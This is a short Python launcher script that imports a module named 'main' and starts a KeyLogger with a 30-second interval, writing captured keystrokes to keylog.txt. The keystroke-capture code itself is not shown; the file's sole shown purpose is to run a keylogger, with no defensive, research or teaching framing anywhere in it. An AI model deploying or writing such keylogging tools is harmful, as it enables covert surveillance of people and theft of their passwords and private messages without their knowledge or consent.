import main

def main_run():
    kl = main.KeyLogger(time_interval=30, logfile="keylog.txt")
    kl.start()

if __name__ == "__main__":
    main_run()